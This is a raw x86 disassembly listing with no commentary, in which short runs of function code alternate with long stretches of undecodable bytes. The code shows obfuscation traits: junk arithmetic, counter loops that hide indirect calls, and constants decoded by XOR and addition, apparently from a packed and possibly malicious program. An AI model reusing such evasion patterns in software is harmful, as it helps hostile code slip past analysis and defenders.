  40525a:	mov    DWORD PTR [edx],eax
  40525c:	mov    eax,DWORD PTR [ebp+0x14]
  40525f:	mov    edx,DWORD PTR [ebp+0x10]
  405262:	mov    DWORD PTR [edx+0x4],eax
  405265:	mov    eax,DWORD PTR [ebp+0x18]
  405268:	mov    edx,DWORD PTR [ebp+0x10]
  40526b:	jmp    0x405478
  405270:	sar    DWORD PTR [edx+ebp*4],cl
  405273:	push   ebp
  405274:	mov    cl,0x71
  405276:	icebp  
  405277:	mov    eax,0xd68c6305
  40527c:	inc    ecx
  40527d:	fstp   TBYTE PTR [edx]
  40527f:	daa    
  405280:	(bad)  
  405281:	sub    al,0x7e
  405283:	jle    0x4052f3
  405285:	jg     0x405305
  405287:	jle    0x405288
  405289:	xchg   BYTE PTR [eax],ah
  40528b:	dec    eax
  40528c:	cld    
  40528d:	and    dl,BYTE PTR [eax-0x3d]
  405290:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405291:	xor    BYTE PTR [edx-0x59],al
  405294:	adc    edx,edx
  405296:	cmc    
  405297:	outs   dx,BYTE PTR ds:[esi]
  405298:	push   0x307c8f60
  40529d:	sbb    eax,DWORD PTR [ebx+edx*8+0x1b]
  4052a1:	jno    0x405287
  4052a3:	mov    cl,BYTE PTR [edi]
  4052a5:	pusha  
  4052a6:	in     eax,dx
  4052a7:	loop   0x4052c1
  4052a9:	xor    DWORD PTR [eax],ebx
  4052ab:	cmp    al,0xb4
  4052ad:	out    dx,al
  4052ae:	jbe    0x405283
  4052b0:	out    0xcf,al
  4052b2:	enter  0xe82e,0xae
  4052b6:	pop    esi
  4052b7:	mov    ?,WORD PTR [ecx]
  4052b9:	lds    ecx,FWORD PTR [ebp+ebp*1-0x6b1dcf5d]
  4052c0:	push   0xffffff9a
  4052c2:	xchg   ecx,eax
  4052c3:	enter  0xf44a,0xc0
  4052c7:	fwait
  4052c8:	(bad)  
  4052c9:	jmp    0xbcb0:0xfe5b2c0b
  4052d0:	out    0x27,eax
  4052d2:	inc    ecx
  4052d3:	lods   al,BYTE PTR ds:[esi]
  4052d4:	jp     0x40528e
  4052d6:	cdq    
  4052d7:	call   0x8769ec73
  4052dc:	arpl   WORD PTR [edx+0x65],cx
  4052df:	(bad)  
  4052e0:	fild   QWORD PTR [eax-0x37]
  4052e3:	add    BYTE PTR [ebx+0x22d8e262],dh
  4052e9:	push   esi
  4052ea:	xchg   DWORD PTR ds:0xe6fc999f,edi
  4052f0:	sbb    BYTE PTR [ecx+0x64],bh
  4052f3:	stos   BYTE PTR es:[edi],al
  4052f4:	lods   al,BYTE PTR ds:[esi]
  4052f5:	mov    al,0x81
  4052f7:	in     eax,dx
  4052f8:	sub    DWORD PTR ds:0xe7683259,edi
  4052fe:	ds dec ecx
  405300:	ss (bad) 
  405302:	popf   
  405303:	cmp    DWORD PTR [esi+ebx*2-0x36],eax
  405307:	test   esp,0x7cc56c5c
  40530d:	lea    ebx,[ebx]
  40530f:	mov    ebp,0xf23b7b14
  405314:	pop    ebx
  405315:	xor    eax,0xcdae1840
  40531a:	out    dx,eax
  40531b:	je     0x4052d3
  40531d:	icebp  
  40531e:	sbb    ebp,DWORD PTR [ebp+0x6f]
  405321:	jmp    0x447a82c8
  405326:	or     dl,cl
  405328:	push   edi
  405329:	mov    al,ds:0x89814f59
  40532e:	add    DWORD PTR [eax],eax
  405330:	bound  ecx,QWORD PTR [ecx+0x1ca1368f]
  405336:	pop    esp
  405337:	out    0xca,eax
  405339:	lahf   
  40533a:	aad    0x5b
  40533c:	out    0x44,al
  40533e:	fild   WORD PTR [ebx+0x3d]
  405341:	and    edx,DWORD PTR [edi+0x21]
  405344:	jmp    0x4053a0
  405346:	or     esp,DWORD PTR [esi+0x7e]
  405349:	cs pop ds
  40534b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40534c:	xchg   edx,ebx
  40534e:	inc    eax
  40534f:	ret    
  405350:	mov    bh,al
  405352:	add    al,0x86
  405354:	mov    ch,0x55
  405356:	push   ebp
  405357:	inc    esi
  405358:	inc    esp
  405359:	lock adc eax,0x2ecb5b7f
  40535f:	inc    edi
  405360:	or     ah,BYTE PTR [esi-0x66b09747]
  405366:	test   ebp,edi
  405368:	outs   dx,BYTE PTR ds:[esi]
  405369:	jmp    ebx
  40536b:	mov    bh,0xc6
  40536d:	adc    cl,ch
  40536f:	adc    al,0xe9
  405371:	xlat   BYTE PTR ds:[ebx]
  405372:	stos   BYTE PTR es:[edi],al
  405373:	fucomip st,st(0)
  405375:	arpl   ax,bp
  405377:	jmp    0x1c4a6cc8
  40537c:	sub    eax,ecx
  40537e:	mov    dl,0xda
  405380:	int3   
  405381:	retf   0x8c4c
  405384:	jnp    0x405386
  405386:	dec    ecx
  405387:	test   BYTE PTR [esi],cl
  405389:	retf   
  40538a:	in     eax,dx
  40538b:	pop    eax
  40538c:	pop    es
  40538d:	out    0x1e,al
  40538f:	sub    al,0xa0
  405391:	push   ebp
  405392:	ds clc 
  405394:	addr16 inc esi
  405396:	push   ss
  405397:	fucomip st,st(7)
  405399:	lahf   
  40539a:	cmp    cl,bh
  40539c:	jbe    0x40533e
  40539e:	retf   0x89a8
  4053a1:	(bad)  
  4053a2:	fwait
  4053a3:	mov    DWORD PTR [edi-0x70e767e8],ecx
  4053a9:	ins    BYTE PTR es:[edi],dx
  4053aa:	xchg   esi,eax
  4053ab:	js     0x405408
  4053ad:	push   edi
  4053ae:	enter  0xe96b,0xe0
  4053b2:	pusha  
  4053b3:	inc    esi
  4053b4:	(bad)
  4053b7:	push   ds
  4053b8:	scas   al,BYTE PTR es:[edi]
  4053b9:	repnz inc ebx
  4053bb:	dec    edx
  4053bc:	or     al,0x1e
  4053be:	push   eax
  4053bf:	jl     0x4053f0
  4053c1:	fcomp  QWORD PTR [esi]
  4053c3:	gs add ebp,ecx
  4053c6:	mov    edi,0xcbec7d40
  4053cb:	xchg   BYTE PTR ds:0xdec3bb9c,ch
  4053d1:	stc    
  4053d2:	cmp    dh,BYTE PTR [ebx+ecx*4-0x3beb511c]
  4053d9:	push   eax
  4053da:	cmp    eax,DWORD PTR ds:0x7654c65c
  4053e0:	aaa    
  4053e1:	fistp  DWORD PTR [ebp+0x53]
  4053e4:	jbe    0x405372
  4053e6:	test   eax,0x46ff203d
  4053eb:	mov    edi,0xbb412ed3
  4053f0:	sub    al,0x25
  4053f2:	rcl    DWORD PTR [edx],1
  4053f4:	mov    esp,0xb86a1bc0
  4053f9:	sbb    BYTE PTR [esi+0x168ae03b],0x19
  405400:	xchg   esp,eax
  405401:	push   esi
  405402:	outs   dx,DWORD PTR ds:[esi]
  405403:	or     eax,0x7945595e
  405408:	mov    BYTE PTR [ebp+0x4a],ch
  40540b:	dec    edx
  40540c:	enter  0x65c8,0x58
  405410:	add    al,0x6e
  405412:	pop    ds
  405413:	push   ebp
  405414:	mov    esi,0x95d3acf3
  405419:	sbb    DWORD PTR [ebx],ebx
  40541b:	fdivr  st,st(6)
  40541d:	xchg   DWORD PTR [esi+0x2e],ebp
  405420:	cmp    cl,ch
  405422:	scas   al,BYTE PTR es:[edi]
  405423:	fxch   st(3)
  405425:	ror    DWORD PTR [eax-0x3d],0xf9
  405429:	call   0xf4e8:0x80f23d9a
  405430:	sub    al,0x1
  405432:	or     BYTE PTR [eax+0x7],ch
  405435:	jae    0x405424
  405437:	lock test BYTE PTR [ecx-0x3d4a9e92],bl
  40543e:	sbb    eax,0xb07b7a69
  405443:	retf   
  405444:	outs   dx,DWORD PTR ds:[esi]
  405445:	in     al,dx
  405446:	or     eax,0x6566d946
  40544b:	pop    edx
  40544c:	and    eax,0x2d62b8fd
  405451:	fs data16 jnp 0x40545b
  405455:	sub    ah,BYTE PTR [eax+0xb]
  405458:	dec    ebx
  405459:	jmp    0x2419:0x43e76278
  405460:	lds    esi,FWORD PTR [esi-0x25]
  405463:	fist   DWORD PTR [ebx+0x5e0e23c3]
  405469:	pop    eax
  40546a:	mov    ecx,0x88c786c7
  40546f:	fistp  DWORD PTR [ecx+0x63]
  405472:	mov    esi,0x78db2b85
  405477:	aaa    
  405478:	mov    DWORD PTR [edx+0x8],eax
  40547b:	mov    eax,DWORD PTR [ebp+0x1c]
  40547e:	mov    edx,DWORD PTR [ebp+0x10]
  405481:	mov    DWORD PTR [edx+0xc],eax
  405484:	mov    eax,DWORD PTR [ebp+0x20]
  405487:	mov    edx,DWORD PTR [ebp+0x10]
  40548a:	mov    DWORD PTR [edx+0x10],eax
  40548d:	mov    eax,eax
  40548f:	mov    eax,DWORD PTR [ebp+0x14]
  405492:	test   eax,eax
  405494:	mov    eax,DWORD PTR [ebp+0x8]
  405497:	jne    0x4054a0
  40549d:	mov    eax,DWORD PTR [ebp+0xc]
  4054a0:	xor    eax,ecx
  4054a2:	add    eax,0x32729b
  4054a7:	leave  
  4054a8:	ret    0x1c
  4054ab:	push   ebp
  4054ac:	mov    ebp,esp
  4054ae:	sub    esp,0x78
  4054b1:	mov    eax,ds:0x4121a8
  4054b6:	mov    DWORD PTR [ebp-0x10],eax
  4054b9:	mov    eax,ds:0x4122b4
  4054be:	mov    DWORD PTR [ebp-0x30],eax
  4054c1:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  4054c8:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  4054cf:	mov    eax,ds:0x4304df
  4054d4:	sbb    DWORD PTR ds:0x430445,eax
  4054da:	mov    eax,DWORD PTR [ebp-0xc]
  4054dd:	xor    DWORD PTR ds:0x430471,0x5a75
  4054e7:	push   ebx
  4054e8:	push   esi
  4054e9:	push   edi
  4054ea:	or     DWORD PTR ds:0x430455,0x19e9
  4054f4:	mov    esi,0x7510854
  4054f9:	xor    eax,esi
  4054fb:	mov    edi,0x32729b
  405500:	add    eax,edi
  405502:	or     DWORD PTR ds:0x4304e3,0x57a7
  40550c:	mov    DWORD PTR [ebp-0x20],eax
  40550f:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  405516:	and    DWORD PTR ds:0x430455,0x0
  405520:	jmp    0x405530
  405525:	mov    eax,ds:0x430455
  40552a:	inc    eax
  40552b:	mov    ds:0x430455,eax
  405530:	cmp    DWORD PTR ds:0x430455,0x1d
  405537:	jae    0x4057cb
  40553d:	cmp    DWORD PTR ds:0x430455,0x4
  405544:	jne    0x405555
  40554a:	push   0x35c7
  40554f:	call   DWORD PTR ds:0x42ec17
  405555:	cmp    DWORD PTR ds:0x430455,0x3
  40555c:	jne    0x40556d
  405562:	mov    eax,ds:0x430455
  405567:	inc    eax
  405568:	mov    ds:0x430455,eax
  40556d:	jmp    0x405525
  405572:	mov    DWORD PTR ds:0x430471,0x14
  40557c:	cmp    DWORD PTR ds:0x430471,0x0
  405583:	je     0x4057cb
  405589:	cmp    DWORD PTR ds:0x430471,0x2
  405590:	jne    0x4055a2
  405596:	push   DWORD PTR [ebp-0x20]
  405599:	push   DWORD PTR [ebp-0x20]
  40559c:	call   DWORD PTR ds:0x42eaa3
  4055a2:	cmp    DWORD PTR ds:0x430471,0x3
  4055a9:	jne    0x4055bd
  4055af:	xor    eax,eax
  4055b1:	xor    eax,DWORD PTR ds:0x430471
  4055b7:	dec    eax
  4055b8:	mov    ds:0x430471,eax
  4055bd:	mov    eax,ds:0x430471
  4055c2:	dec    eax
  4055c3:	mov    ds:0x430471,eax
  4055c8:	jmp    0x40557c
  4055cd:	or     DWORD PTR ds:0x42edd3,edi
  4055d3:	jmp    0x4057cb
  4055d8:	jl     0x405580
  4055da:	inc    bl
  4055dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055dd:	jecxz  0x405620
  4055df:	popa   
  4055e0:	xor    eax,0x2aa2c60a
  4055e5:	fimul  WORD PTR [edx]
  4055e7:	fidiv  DWORD PTR [esi]
  4055e9:	sub    bh,BYTE PTR [esi+0x7e]
  4055ec:	push   ebp
  4055ed:	jg     0x40566d
  4055ef:	jle    0x4055a5
  4055f1:	(bad)
  4055f4:	xor    al,0x8e
  4055f6:	sti    
  4055f7:	pop    ds
  4055f8:	js     0x40559a
  4055fa:	mov    dl,0xd
  4055fc:	mov    eax,0x9952d5bb
  405601:	mov    DWORD PTR [edx+ebx*2+0x10],ebp
  405605:	stc    
  405606:	test   al,0x70
  405608:	imul   BYTE PTR [edx+0x2966389e]
  40560e:	xor    al,0x7f
  405610:	leave  
  405611:	push   esi
  405612:	push   edi
  405613:	inc    edi
  405614:	lds    ebx,FWORD PTR [esp+edi*2+0x20]
  405618:	push   ecx
  405619:	imul   ecx,DWORD PTR [ecx-0x63653ed8],0x73
  405620:	jle    0x405667
  405622:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405623:	rol    DWORD PTR [edi-0x74],1
  405626:	push   ss
  405627:	cs push 0xca80e6df
  40562d:	retf   
  40562e:	xchg   edi,eax
  40562f:	imul   BYTE PTR [ebx-0x30]
  405632:	iret   
  405633:	dec    ebp
  405634:	arpl   WORD PTR ds:0x195cb9f8,bx
  40563a:	mov    bh,0x7e
  40563c:	call   0xdace:0x84fe5d8d
  405643:	sub    edx,DWORD PTR [ebx-0x68]
  405646:	cmp    al,0x7a
  405648:	sbb    esi,DWORD PTR [edx-0x51958870]
  40564e:	cld    
  40564f:	sar    dh,0xe4
  405652:	pop    eax
  405653:	jle    0x4056be
  405655:	iret   
  405656:	pusha  
  405657:	in     eax,0x8d
  405659:	in     eax,0x9f
  40565b:	mov    esp,0x12883803
  405660:	scas   eax,DWORD PTR es:[edi]
  405661:	jmp    0xae16b8ca
  405666:	fnstenv [ecx-0x7b]
  405669:	inc    edx
  40566a:	jno    0x405661
  40566c:	or     eax,0x4b1c3bea
  405671:	lock arpl WORD PTR [ecx+0x23],dx
  405675:	xchg   ecx,eax
  405676:	fimul  WORD PTR [edx-0x77b5dd17]
  40567c:	icebp  
  40567d:	shl    edx,cl
  40567f:	(bad)  
  405680:	icebp  
  405681:	pop    eax
  405682:	cdq    
  405683:	mov    ebp,ecx
  405685:	jne    0x405652
  405687:	cdq    
  405688:	xchg   edx,eax
  405689:	stos   BYTE PTR es:[edi],al
  40568a:	call   0x92c4:0x5a0f4c55
  405691:	xor    DWORD PTR [edi-0x7e],ebx
  405694:	fsubr  st(1),st
  405696:	fwait
  405697:	dec    esi
  405698:	hlt    
  405699:	fld    TBYTE PTR [esi]
  40569b:	dec    esp
  40569c:	xchg   bh,bh
  40569e:	sub    al,0x9b
  4056a0:	push   0xc658f8ef
  4056a5:	les    esp,FWORD PTR [ecx-0x62]
  4056a8:	call   0x856e8335
  4056ad:	xchg   ecx,eax
  4056ae:	pop    ecx
  4056af:	push   esi
  4056b0:	rep lods eax,DWORD PTR ds:[esi]
  4056b2:	add    eax,0x5ead125c
  4056b7:	jge    0x4056c1
  4056b9:	xor    DWORD PTR [ecx],ecx
  4056bb:	and    ah,BYTE PTR [eax+esi*2]
  4056be:	in     al,0x2b
  4056c0:	neg    BYTE PTR [edi-0x1a6fe5b6]
  4056c6:	lock mov ds:0x27fcf173,al
  4056cc:	div    BYTE PTR [ecx+esi*4+0x59]
  4056d0:	std    
  4056d1:	and    dh,BYTE PTR [edx+0x39]
  4056d4:	(bad)  
  4056d5:	fwait
  4056d6:	xor    al,0xba
  4056d8:	out    dx,al
  4056d9:	jg     0x405705
  4056db:	in     eax,0x23
  4056dd:	push   cs
  4056de:	mov    eax,0xbfb442ff
  4056e3:	xchg   ebx,eax
  4056e4:	(bad)  
  4056e5:	pop    esi
  4056e6:	jle    0x40571c
  4056e8:	cmp    cl,ah
  4056ea:	fnstcw WORD PTR [ebx-0x12bf348e]
  4056f0:	mov    edi,0x4c77e224
  4056f5:	dec    eax
  4056f6:	pop    eax
  4056f7:	in     al,dx
  4056f8:	aam    0xfd
  4056fa:	jbe    0x405762
  4056fc:	inc    ebx
  4056fd:	jmp    0xe2fe:0x9329f07e
  405704:	or     al,0xec
  405706:	sbb    ah,BYTE PTR [eax]
  405708:	es imul esi,edx,0xfffffff3
  40570c:	stos   DWORD PTR es:[edi],eax
  40570d:	add    BYTE PTR [edx+0x53],dl
  405710:	aas    
  405711:	dec    edi
  405712:	mov    eax,DWORD PTR [ecx+0x2fb8e1cb]
  405718:	jp     0x4056e8
  40571a:	push   edi
  40571b:	push   ebp
  40571c:	fbstp  TBYTE PTR [eax+0x20]
  40571f:	xchg   esp,eax
  405720:	std    
  405721:	in     eax,dx
  405722:	xor    ecx,DWORD PTR [edx-0x54]
  405725:	sbb    ch,al
  405727:	mov    ah,0xfa
  40572a:	cdq    
  40572b:	inc    ebp
  40572c:	xor    ah,BYTE PTR [edi+ebx*2-0x62a890f5]
  405733:	xchg   ebp,eax
  405734:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405735:	xlat   BYTE PTR ds:[ebx]
  405736:	inc    ebp
  405737:	hlt    
  405738:	retf   
  405739:	popf   
  40573a:	rcr    cl,1
  40573c:	and    eax,DWORD PTR [ecx+0x38]
  40573f:	dec    edi
  405740:	(bad)  
  405741:	dec    edx
  405742:	daa    
  405743:	into   
  405744:	or     DWORD PTR [ebp+0x5b9c72e4],edx
  40574a:	inc    ecx
  40574b:	add    ecx,ebx
  40574d:	es sub al,0x33
  405750:	xchg   edi,eax
  405751:	mov    edx,esp
  405753:	push   ds
  405754:	xor    edx,DWORD PTR [esi+0x55]
  405757:	inc    edi
  405758:	fstp   st(4)
  40575a:	pop    eax
  40575b:	popf   
  40575c:	stc    
  40575d:	pop    ebx
  40575e:	ins    BYTE PTR es:[edi],dx
  40575f:	fmul   QWORD PTR [eax+0x6c]
  405762:	mov    ecx,0x39355c23
  405767:	pop    ds
  405768:	adc    al,0xfe
  40576a:	or     esp,edi
  40576c:	pop    ecx
  40576d:	inc    edx
  40576e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40576f:	sbb    DWORD PTR [edx],0xffffffc5
  405772:	pusha  
  405773:	call   0xae662973
  405778:	dec    ebp
  405779:	sub    al,0x90
  40577b:	int    0x81
  40577d:	xchg   ecx,eax
  40577e:	aad    0x92
  405780:	pop    ecx
  405781:	mov    al,0xf2
  405783:	xchg   ecx,eax
  405784:	outs   dx,DWORD PTR ds:[esi]
  405785:	jnp    0x4057ab
  405787:	pop    ebx
  405788:	dec    ecx
  405789:	std    
  40578a:	xchg   ebx,eax
  40578b:	into   
  40578c:	std    
  40578d:	mov    ebx,DWORD PTR [esi]
  40578f:	xchg   ebx,eax
  405790:	cmp    eax,0x19a4076f
  405795:	repnz add al,BYTE PTR [edx]
  405798:	(bad)  
  405799:	ds (bad) 
  40579b:	sbb    BYTE PTR [ebp-0x236b1c34],dl
  4057a1:	xchg   esp,eax
  4057a2:	sbb    al,0xa2
  4057a5:	mov    ss,WORD PTR [esi-0x3e]
  4057a8:	int3   
  4057a9:	mov    esp,0xe90c7a34
  4057ae:	std    
  4057af:	push   ebx
  4057b0:	add    BYTE PTR [ebp+ecx*8-0x11],0xaf
  4057b5:	mov    bh,0x3
  4057b7:	imul   ebp,esp,0x46
  4057ba:	mov    esi,0x95c44947
  4057bf:	or     eax,0xf4a52eed
  4057c4:	push   ebx
  4057c5:	stc    
  4057c6:	mov    eax,0x46be3b04
  4057cb:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  4057d2:	mov    DWORD PTR ds:0x42eddb,0x1a
  4057dc:	cmp    DWORD PTR ds:0x42eddb,0x0
  4057e3:	je     0x405811
  4057e9:	cmp    DWORD PTR ds:0x42eddb,0x29
  4057f0:	jne    0x4057ff
  4057f6:	push   DWORD PTR [ebp-0x24]
  4057f9:	call   DWORD PTR ds:0x42e9d7
  4057ff:	mov    eax,ds:0x42eddb
  405804:	dec    eax
  405805:	mov    ds:0x42eddb,eax
  40580a:	jmp    0x4057dc
  40580f:	neg    eax
  405811:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  405818:	mov    eax,ds:0x42e7c8
  40581d:	or     DWORD PTR ds:0x430445,eax
  405823:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  40582a:	mov    eax,DWORD PTR [ebp-0xc]
  40582d:	and    DWORD PTR ds:0x430439,0x7e31
  405837:	xor    eax,esi
  405839:	add    eax,edi
  40583b:	mov    DWORD PTR [ebp-0x18],eax
  40583e:	sbb    DWORD PTR ds:0x42e7d4,0x48a8
  405848:	mov    DWORD PTR [ebp-0x1c],0xf89c853e
  40584f:	sub    eax,DWORD PTR ds:0x42edef
  405855:	mov    BYTE PTR [ebp-0x1],0x67
  405859:	mov    DWORD PTR ds:0x42eddb,0x1c
  405863:	cmp    DWORD PTR ds:0x42eddb,0x0
  40586a:	je     0x4058ae
  405870:	cmp    DWORD PTR ds:0x42eddb,0xe
  405877:	jne    0x405886
  40587d:	push   DWORD PTR [ebp-0x18]
  405880:	call   DWORD PTR ds:0x42e9db
  405886:	cmp    DWORD PTR ds:0x42eddb,0xf
  40588d:	jne    0x40589e
  405893:	mov    eax,ds:0x42eddb
  405898:	dec    eax
  405899:	mov    ds:0x42eddb,eax
  40589e:	mov    eax,ds:0x42eddb
  4058a3:	dec    eax
  4058a4:	mov    ds:0x42eddb,eax
  4058a9:	jmp    0x405863
  4058ae:	mov    eax,DWORD PTR [ebp-0xc]
  4058b1:	or     DWORD PTR ds:0x430441,0x42edd3
  4058bb:	xor    eax,esi
  4058bd:	add    eax,edi
  4058bf:	mov    DWORD PTR [ebp-0x18],eax
  4058c2:	mov    eax,DWORD PTR [ebp-0x24]
  4058c5:	sbb    DWORD PTR ds:0x430435,0x42e7c4
  4058cf:	xor    eax,esi
  4058d1:	sbb    DWORD PTR ds:0x4304d3,0xd15
  4058db:	add    eax,edi
  4058dd:	inc    DWORD PTR ds:0x43045d
  4058e3:	push   eax
  4058e4:	xor    eax,eax
  4058e6:	xor    eax,DWORD PTR ds:0x43043d
  4058ec:	xor    DWORD PTR ds:0x430461,eax
  4058f2:	mov    eax,DWORD PTR [ebp-0x28]
  4058f5:	sub    DWORD PTR ds:0x430451,0x42edef
  4058ff:	xor    eax,esi
  405901:	or     DWORD PTR ds:0x430441,0x42e7c8
  40590b:	add    eax,edi
  40590d:	push   eax
  40590e:	or     eax,DWORD PTR ds:0x430441
  405914:	mov    eax,DWORD PTR [ebp-0x1c]
  405917:	or     DWORD PTR ds:0x42edd3,0x39ed
  405921:	xor    eax,esi
  405923:	not    DWORD PTR ds:0x42edeb
  405929:	add    eax,edi
  40592b:	adc    DWORD PTR ds:0x430469,0x4304eb
  405935:	push   eax
  405936:	sbb    DWORD PTR ds:0x430469,0x42e7c8
  405940:	lea    eax,[ebp-0x78]
  405943:	push   eax
  405944:	dec    DWORD PTR ds:0x4304d3
  40594a:	push   DWORD PTR [ebp-0xc]
  40594d:	sub    DWORD PTR ds:0x4304d3,0x42e7d4
  405957:	push   DWORD PTR [ebp-0x14]
  40595a:	and    DWORD PTR ds:0x43043d,0x42eddb
  405964:	call   0x4046ad
  405969:	test   eax,eax
  40596b:	je     0x405da5
  405971:	lea    eax,[ebp-0x78]
  405974:	sbb    DWORD PTR ds:0x42edcf,0x42edeb
  40597e:	push   eax
  40597f:	movzx  eax,BYTE PTR ds:0x430455
  405986:	sbb    eax,DWORD PTR ds:0x43046d
  40598c:	mov    ds:0x430455,eax
  405991:	jmp    0x405b89
  405996:	xor    DWORD PTR [ecx+0x5c],esi
  405999:	sbb    eax,0x7171315c
  40599e:	repnz fistp WORD PTR [esi-0x48]
  4059a2:	adc    BYTE PTR [esi+0x6a],al
  4059a5:	xchg   ecx,eax
  4059a6:	or     eax,0x557e7e28
  4059ab:	jg     0x405a2b
  4059ad:	jle    0x405934
  4059af:	and    eax,0x21f9122a
  4059b4:	mov    eax,0xc47b2da9
  4059b9:	pop    ecx
  4059ba:	and    edx,DWORD PTR [ecx]
  4059bc:	inc    edx
  4059bd:	fist   DWORD PTR [esi+ecx*8+0x7]
  4059c1:	cmc    
  4059c2:	jmp    0x80a302ea
  4059c7:	das    
  4059c8:	push   edx
  4059c9:	jg     0x405963
  4059cb:	or     cl,0xc8
  4059ce:	or     bh,dl
  4059d0:	dec    esi
  4059d1:	in     al,dx
  4059d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059d3:	call   DWORD PTR [ecx-0x7633d8f]
  4059d9:	int3   
  4059da:	sub    ebx,edx
  4059dc:	test   al,0x0
  4059de:	(bad)  
  4059df:	lahf   
  4059e0:	jecxz  0x405a47
  4059e2:	dec    edx
  4059e3:	pop    ecx
  4059e4:	or     ch,dh
  4059e6:	jmp    0x405989
  4059e8:	fcomp  DWORD PTR [edi+eax*2]
  4059eb:	lock aam 0xff
  4059ee:	sbb    edx,eax
  4059f0:	xor    eax,0xcefefe03
  4059f5:	jmp    0x9e43:0x6589cc88
  4059fc:	addr16 sub esi,ebp
  4059ff:	jnp    0x4059de
  405a01:	aam    0xcd
  405a03:	mov    ds:0xdaed5ac7,eax
  405a08:	or     eax,0x50155624
  405a0d:	xchg   di,ax
  405a0f:	cmp    BYTE PTR [esi+esi*8-0x71c596dd],0xb4
  405a17:	push   esp
  405a18:	pushf  
  405a19:	cmp    DWORD PTR [eax],ebp
  405a1b:	dec    ebx
  405a1c:	xchg   DWORD PTR [eax+0x26],edx
  405a1f:	xchg   edi,eax
  405a20:	dec    bl
  405a22:	mov    eax,ds:0x7c05134b
  405a27:	outs   dx,BYTE PTR ds:[esi]
  405a28:	jnp    0x4059c0
  405a2a:	sbb    bl,BYTE PTR [edi+0x252717a1]
  405a30:	pusha  
  405a31:	retf   
  405a32:	in     eax,0xf0
  405a34:	fld    QWORD PTR [ebp-0x54895e70]
  405a3a:	leave  
  405a3b:	stc    
  405a3c:	dec    ebp
  405a3d:	inc    esp
  405a3e:	mov    BYTE PTR ds:0xd6a1a3dd,dh
  405a44:	les    edi,FWORD PTR [edi-0x10]
  405a47:	jns    0x405a14
  405a49:	in     al,dx
  405a4a:	sub    DWORD PTR [ecx-0x31],ebx
  405a4d:	nop
  405a4e:	repnz cld 
  405a50:	out    0x6e,eax
  405a52:	in     eax,0xd9
  405a54:	(bad)  
  405a55:	fld    TBYTE PTR [ecx+0x60d383cb]
  405a5b:	mov    dh,0xe5
  405a5d:	sub    eax,0xc978ba40
  405a62:	pop    edx
  405a63:	mov    cl,BYTE PTR fs:[esi]
  405a66:	jns    0x405a4f
  405a68:	mov    ds:0xc9d7fa12,al
  405a6d:	and    eax,0x98f6b881
  405a72:	cmp    edi,eax
  405a74:	fisttp WORD PTR [ebx]
  405a76:	dec    edi
  405a77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a78:	or     dh,BYTE PTR [eax+0x6d]
  405a7b:	mov    dl,0x34
  405a7d:	xchg   esp,eax
  405a7e:	fdiv   QWORD PTR [eax+0x71]
  405a81:	lods   eax,DWORD PTR ds:[esi]
  405a82:	ins    DWORD PTR es:[edi],dx
  405a83:	dec    esp
  405a84:	and    al,BYTE PTR [edx+0x2b]
  405a87:	rol    BYTE PTR [ebp+0xc6dde87],cl
  405a8d:	lock sbb DWORD PTR [edx-0x630cfe72],edi
  405a94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a95:	jnp    0x405a88
  405a97:	adc    DWORD PTR ds:0x72a6218f,ebx
  405a9d:	aad    0x46
  405a9f:	xor    BYTE PTR [edi+esi*1-0x1a],0x4c
  405aa4:	ja     0x405a4d
  405aa6:	jmp    0xc81a:0x3d8406bb
  405aad:	push   edi
  405aae:	(bad)
  405ab2:	test   BYTE PTR [edi+0x1b0a4ac1],ch
  405ab8:	jecxz  0x405a93
  405aba:	jnp    0x405ae0
  405abc:	add    al,0xcb
  405abe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405abf:	cmp    BYTE PTR [ecx+edi*8+0x5f8154f4],0x8d
  405ac7:	pop    ds
  405ac8:	push   ss
  405ac9:	je     0x405b22
  405acb:	in     eax,0x85
  405acd:	jmp    0x405aaa
  405acf:	push   ss
  405ad0:	mov    edi,0x7246ace4
  405ad5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ad6:	add    DWORD PTR [eax+0x338c1793],0xab3f2c3a
  405ae0:	fucom  st(5)
  405ae2:	sbb    cl,BYTE PTR [edi+0x6c]
  405ae5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ae6:	loopne 0x405b29
  405ae8:	lea    edi,[edx+0x650d1b4]
  405aee:	inc    edx
  405aef:	in     eax,dx
  405af0:	pop    ebp
  405af1:	js     0x405acc
  405af3:	cmp    BYTE PTR [ebx],ch
  405af5:	ret    
  405af6:	retf   0x2b85
  405af9:	scas   eax,DWORD PTR es:[edi]
  405afa:	adc    eax,0x8f3bde1b
  405aff:	sub    dl,dl
  405b01:	out    0xd5,al
  405b03:	mov    ds:0x63b983f0,eax
  405b08:	lea    ecx,[ebp-0x62372c4b]
  405b0e:	pusha  
  405b0f:	(bad)  
  405b10:	mov    bl,0xdf
  405b12:	dec    edi
  405b13:	add    al,0xab
  405b15:	sbb    eax,0xe0ca784d
  405b1a:	int    0x7c
  405b1c:	pop    ebx
  405b1d:	pop    ebp
  405b1e:	mov    BYTE PTR [eax-0x3fdfb1f5],ch
  405b24:	sti    
  405b25:	xchg   ebx,eax
  405b26:	jbe    0x405b1b
  405b28:	daa    
  405b29:	xchg   ebx,esi
  405b2b:	inc    ebx
  405b2c:	sub    DWORD PTR [edx],ebp
  405b2e:	jno    0x405ac5
  405b30:	cwde   
  405b31:	int3   
  405b32:	jno    0x405b43
  405b34:	and    ch,BYTE PTR [edi]
  405b36:	and    eax,0xebdd30b2
  405b3b:	sbb    BYTE PTR [ecx-0x7f01c2ed],al
  405b41:	inc    ebx
  405b42:	sub    DWORD PTR [ecx+ecx*8],edi
